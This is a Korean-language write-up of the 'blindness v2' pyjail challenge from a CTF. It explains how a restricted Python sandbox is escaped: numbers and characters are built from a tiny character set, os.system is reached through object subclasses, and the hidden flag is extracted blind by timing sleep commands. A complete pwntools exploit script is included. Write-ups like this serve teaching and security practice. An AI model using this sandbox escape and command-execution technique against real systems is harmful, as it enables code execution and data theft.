---
ctf_name: "jail CTF"
challenge_name: "blindness v2"
category: "misc"           # web / pwn / rev / crypto / misc
difficulty: "medium"      # easy / medium / hard / insane
author: "aswe0810m"
date: "2026-07-28"
points: 92
tags: [pyjail, blind]
---

# 문제명

## 문제 설명

> 👁

- nc challs.pyjail.club 24747
- `main.py`, `Dockerfile`, `flag.txt`, `compose.yaml` 제공

## 풀이

### 분석

문제에서 제공되 `main.py`는 다음과 같다.

```python
#!/usr/local/bin/python3
import sys
import os
import subprocess

inp = input('blindness > ')
assert all(i in '()._abcdefghijklmnopqrstuvwxyz' or i.isspace() for i in inp), 'your input is too blinding'

sys.stdout.close()
flag = open('flag.txt').read()

# source: https://dmoj.ca/problem/helloworldharder
template = f'''class Sandbox(object):
    def __init__(self):
        import sys
        for attr in ["__file__","__loader__","__name__","__doc__","__package__","__annotations__","__spec__","__cached__"]:
            if hasattr(sys.modules["__main__"],attr):
                delattr(sys.modules["__main__"],attr)

        if hasattr(sys.modules["__main__"].__dict__["__builtins__"],"__dict__"):
            original_builtins = sys.modules["__main__"].__dict__["__builtins__"].__dict__.copy()
            for builtin in original_builtins:
                del sys.modules["__main__"].__dict__["__builtins__"].__dict__[builtin]
        else:
            original_builtins = sys.modules["__main__"].__dict__["__builtins__"]
            for builtin in list(original_builtins):
                del sys.modules["__main__"].__dict__["__builtins__"][builtin]

        del sys.modules["__main__"].__dict__["__builtins__"]
        del sys

Sandbox()
del Sandbox

flag = '{flag.strip()}'
{inp}'''

subprocess.run(
    ['/usr/local/bin/python3', '-c', template],
    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
)
```

해당 코드를 분석하면 다음과 같은 사실을 알 수 있다.
1. 입력으로 넣을 수 있는 문자들이 제한되어 있다. 숫자, 대문자등을 입력을 넣을 수 없다.
2. Sandbox 클래스를 통해서 내장함수등을 접근할 수 없게 되어 있다.
3. 출력이 보이지 않는다.

### 취약점

misc이기 때문에 취약점이라고 하기는 그렇지만, 사용자의 입력을 코드로 실행하고 있다. 이를 완화하기 위한 여러 조건들이 존재하지만 이를 우회할 방법들이 존재한다.

### 익스플로잇

1. 입력 제한 우회

    먼저 숫자를 입력으로 줄 수 없기 때문에, 참 거짓을 이용하여 숫자를 만들어야 한다. `not ()`의 경우 빈 튜플은 0이고, 해당 튜플에 not을 붙여 `1`이라는 값을 만들 수 있다(`not (not ()) = 0`). 또한 `__add__()`를 이용하여 `(not ()).__add__(not ())`를 하게 되면 `2`를 만들 수 있다. 이와 같은 방식으로 모든 숫자들을 구현할 수 있게 된다.

    숫자만이 아니라 다른 제한된 문자들의 경우 `(97).to_bytes().decode()`와 같은 방식으로 모든 ASCII를 생성할 수 있다.

2. Sandbox 클래스를 우회

    Sandbox 클래스를 통해서 직접적인 내장 함수 접근을 막아두었다. 구현된 것을 보면 내장 함수에 대한 접근만을 막은 것이 아니라 내장 함수를 가지고 있는 dict에서 해당 함수들을 제거하였기 때문에 단순한 방법으로 접근할 수 없다.

    파이썬에서 모든 클래스는 `object`라는 최상위 클래스에 상속된다. 그리고 `object.__subclasses()__()`를 호출하면 `object`가 상속한 모든 클래스를 가져올 수 있다. 여기에는 파이썬 내부적으로 로드된 수백 개의 클래스가 존재하고, 이 클래스들 중 일부는 `os` 모듈 안에서 정의된거라, 그 클래스의 `__init__.__globals__`에 `os.system` 같은 함수가 들어 있다. 따라서 이와 같은 방식으로 Sandbox 클래스도 우회할 수 있다.

3. 출력 제한 우회

    출력 자체가 되지 않기 때문에 아예 다른 방식으로 우회한다. 출력을 하지 않고, flag의 문자들과 모든 문자들을 하나하나 비교하여 and의 조기 종료를 이용한다. 코드를 보면 더 쉽게 이해할 수 있다.

```python
from pwn import *

def make_num(n):
    zero = "(not (not()))"
    add = ".__add__(not ())"
    num = zero
    for _ in range(n):
        num += add
    return num

def make_char(c):
    n = ord(c)
    return f"({make_num(n)}).to_bytes().decode()"

def make_str(s):
    result = make_char(s[0])
    for c in s[1:]:
        result = f"({result}).__add__({make_char(c)})"
    return result

# 167이 system 관련 클래스
def find_os_class():
    system_str = make_str("system")
    sleep_str = make_str("sleep 3")
    for i in range(130, 200):
        payload = f'().__class__.__base__.__subclasses__().__getitem__({make_num(i)}).__init__.__globals__.__getitem__({system_str})({sleep_str})'
        io = remote('challs.pyjail.club', 24747)
        io.recvuntil(b'blindness > ')
        io.sendline(payload.encode())
        
        start = time.time()
        io.recvall(timeout=5)
        elapsed = time.time() - start
        io.close()
        
        if elapsed > 2:
            print(f"system detected index: {i}")
            return
        else:
            print(f"bad index: {i}")
            
def find_flag():
    flag = ""
    charset = "()._abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}"
    sleep_str = make_str("sleep 5")
    system = f"().__class__.__base__.__subclasses__().__getitem__({make_num(167)}).__init__.__globals__.__getitem__({make_str('system')})"
    for i in range(50):
        for c in charset:
            payload = f'flag.__getitem__({make_num(i)}).__eq__({make_char(c)}) and ({system})({sleep_str})'
            io = remote('challs.pyjail.club', 24747)
            io.recvuntil(b'blindness > ')
            io.sendline(payload.encode())
        
            start = time.time()
            io.recvall(timeout=5)
            elapsed = time.time() - start
            io.close()
        
            if elapsed > 4:
                flag += c
                print(f"flag[{i}] = {c}")
                print(flag)
                break
        if flag.endswith('}'):
            return flag
            
flag = find_flag()
print(flag)
```

`find_os_class()` 함수를 먼저 실행하여 os 함수에 해당하는 idx를 찾아서 `find_flag()` 함수에서 이용한 것이다.

## 플래그

```
jail{REDACTED}
```

## 배운 점

- 처음으로 풀어보는 유형으로 jail(pyjail) 문제들이 어떤식으로 이루어지는지 알게되었다.

- 출력이 되지 않는 환경에서 early termination을 이용하여 문자를 알아낼 수 있는 방법을 알게되었다.

- 숫자를 입력할 수 없는 환경에서는 true/false와 같은 논리 값으로 우회하여 값을 생성할 수 있는 방법을 알게되었다.